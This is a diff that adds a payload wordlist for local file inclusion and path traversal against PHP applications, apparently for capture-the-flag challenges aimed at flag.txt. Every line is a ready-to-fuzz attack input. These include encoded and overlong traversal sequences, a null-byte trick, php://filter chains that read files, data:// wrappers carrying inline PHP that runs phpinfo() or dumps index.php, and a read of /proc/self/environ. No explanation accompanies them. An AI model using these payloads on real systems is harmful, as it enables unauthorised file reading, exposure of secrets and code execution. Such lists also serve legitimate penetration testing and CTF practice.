@@ -1,0 +1,30 @@
+../../../../../../../flag.txt
+....//....////flag.txt
+....\/....\/\/flag.txt
+%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/flag.txt
+../ / /flag.txt%00
+..%252f..%252f..%252fflag.txt
+..%c0%af..%c0%af..%c0%afflag.txt
+%252e%252e%252fflag.txt
+%252e%252e%252fflag.txt
+\\flag.txt
+php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///flag.txt
+php://filter/string.toupper/string.rot13/string.tolower/resource=file:///flag.txt
+php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code;?>HackingExploit
+php://filter/convert.base64-decode/resource=data://plain/text,ZmxhZy50eHQ=
+php://filter/convert.base64-encode|convert.base64-decode/resource=file:///flag.txt
+php://filter/convert.quoted-printable-encode/resource=data://plain/text,FlagBuDegil
+php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,BuFlagDegil
+php://filter/zlib.deflate/convert.base64-encode/resource=file:///flag.txt
+php://filter/zlib.inflate/resource=flag.txt
+php://fd/3
+data://text/plain,<?php echo base64_encode(file_get_contents("index.php"));?>
+data://text/plain,<?php phpinfo();?>
+data://text/plain;base64,ZmxhZy50eHQ=
+data://text/plain;base64,Li9mbGFnLnR4dA==
+data:text/plain,<?php echo base64_encode(file_get_contents("index.php"));?>
+data:text/plain,<?php phpinfo(); ?>
+data:application/x-httpd-php;base64,ZmxhZy50eHQ=
+data:application/x-httpd-php;base64,Li9mbGFnLnR4dA==
+../../../proc/self/environ 
+../../../flag.txt
